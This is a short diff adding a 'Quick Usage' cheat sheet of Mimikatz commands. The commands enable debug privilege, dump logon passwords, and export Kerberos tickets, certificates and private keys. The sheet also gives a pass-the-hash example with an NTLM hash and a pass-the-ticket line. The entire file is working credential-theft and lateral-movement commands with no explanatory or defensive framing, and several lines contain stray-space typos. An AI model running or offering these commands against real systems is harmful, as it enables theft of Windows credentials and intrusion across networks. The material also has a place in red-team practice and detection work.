@@ -1,0 +1,21 @@
+Quick Usage 
+log
+privilege::debug
+
+sekurlsa
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+
+Kerberos
+kerberos:: list /export
+kerberos::ptt C:\chocolate.kirbi
+
+crypto
+crypto::capi
+crypto:: cng
+crypto:: certificates /export
+crypto:: certificates /export /systemstore: CERT_SYSTEM_STORE_LOCAL_MACHINE
+crypto::keys /export
+crypto::keys /machine /export
